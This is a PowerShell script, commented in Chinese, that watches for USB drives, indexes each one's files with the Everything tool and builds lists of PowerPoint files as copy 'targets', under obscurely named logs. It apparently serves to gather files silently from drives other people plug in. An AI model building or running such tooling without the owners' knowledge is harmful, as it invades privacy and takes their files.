Import-Module .\Util.psm1
Import-Module .\WaitUntilEvtLaunch.psm1
Import-Module .\GenNeedCopyList.psm1

<#* 存储已处理磁盘信息的JSON文件路径 *#>
$diskListJsonPath = "__x.json"
<#* 日志文件路径 *#>
$logPath = "__atb.log"
<#* 再次更新同一磁盘的冷却时间，单位为秒 *#>
$fztime = 10.0
<#* 每次尝试更新间的间隔时间，单位为毫秒 *#>
$slptime = 500.0
<#* 用于生成磁盘文件列表（EFU格式）的EVT实例名 *#>
$evtInctName = "Te"
<#* 磁盘文件列表（EFU格式）存放目录 *#>
$efuPath = "__efu"
<#* 磁盘文件列表（EFU格式）存放目录 *#>
$efupath2 = "__targets"

<#* 主函数：添加/更新磁盘 *#>
function AddDisk($d) {
  <#* $id：磁盘序列号 *#>
  $id = $d.SerialNumber
  <#* $vol：卷对象 *#>
  $vol = $d  | Get-Partition | Get-Volume
  <#* 其形如下表：
     DriveLetter    FriendlyName  FileSystemType DriveType HealthStatus
  ----------------- ------------- -------------- --------- ------------
          E            ******         FAT32      Removable   Healthy   

  OperationalStatus SizeRemaining      Size
  ----------------- ------------- --------------
          OK           **.** GB      **.** GB
  #>
  <#* $letter：盘符 *#>
  $letter = $vol.DriveLetter
  <#* $name：卷标（盘名） *#>
  $name = $vol.FileSystemLabel
  <##> Log -s "Update Disk ($letter`:/) ID:[$id] `"$name`""
  <#* 更新哈希表 *#>
  $hash[$id] = @{
    Letter  = $letter;
    Name    = $name;
    AddTime = TimeStr;
    cpy     = @()
  }
  <#* 保存哈希表至JSON文件 *#>
  WriteJsonFile -path $diskListJsonPath -obj $hash
  <#* 使用指定EVT实例生成整个磁盘的文件列表（EFU格式） *#>
  $excTime = Measure-Command {
    Everything.exe -instance $evtInctName -create-file-list $efuPath\$id.efu $letter`:\
    do {} until((Test-Path $efuPath\$id.efu) -eq $true)
  }
  <##> Log -s "Create EFU file using $($excTime.TotalMilliseconds)ms: $(Resolve-Path $efuPath\$id.efu)"
  $excTime = Measure-Command {
    GenNeedCopyList -efu "$efuPath\$id.efu" -filter "ext:pptx|ext:ppt" -o "$efuPath2\$id"
  }
  <##> Log -s "Gen targets list using $($excTime.TotalMilliseconds)ms: $(Resolve-Path $efuPath2\$id)"
}

<#* 将信息写入日志文件（带时间） *#>
function Log($s) {
  Write-Output "[$(TimeStr)]$s" >> $logPath
}

<#*## #### #### ####
 #*    程序入口    *#
 #*## #### #### ####>

<##> Log -s "LAUNCH"
<#*#: 检查各个目录是否存在，若无，则新建 #>
if ((Test-Path $diskListJsonPath) -ne "True") {
  New-Item $diskListJsonPath
  <##> Log -s "Create $(Resolve-Path $diskListJsonPath)"
}
if ((Test-Path $efuPath) -ne "True") {
  mkdir $efuPath
  <##> Log -s "Create $(Resolve-Path $efuPath)"
}
if ((Test-Path $efupath2) -ne "True") {
  mkdir $efupath2
  <##> Log -s "Create $(Resolve-Path $efupath2)"
}

<#* 从JSON文件中读取已处理磁盘信息哈希表 *#>
$hash = (ReadJsonFile -path $diskListJsonPath)

<#*## #### #### ####
 #*     主循环     *#
 #*## #### #### ####>

While (1) {
  <#* 获取USB磁盘列表 *#>
  $Disks = Get-Disk | Where-Object -FilterScript { $_.Bustype -Eq "USB" }
  <#* 获取到的列表形如：
  Number Friendly Name SerialNumber HealthStatus OperationalStatus TotalSize Partition
  ------ ------------- ------------ ------------ ----------------- --------- ---------
     2     Kingston…   ************    Healthy        Online        **.** GB    MBR
  #>
  <#DEBUG#> Write-Host "$(TimeStr)"
  foreach ($d in $Disks) {
    <#* 获取磁盘序列号 *#>
    $id = $d.SerialNumber
    <#* 若此序列号从未添加过，则添加该磁盘 *#>
    if ($null -eq $hash[$id]) {
      AddDisk -d $d
    }<#* 若此序列号曾添加过，但更新冷却时间已过，那也添加（更新）该磁盘 *#>
    elseif ((TimeCalc -time $hash[$id].AddTime) -gt $fztime) {
      AddDisk -d $d
    }
  }
  <#* 尝试更新间的冷却 *#>
  Start-Sleep -m $slptime
}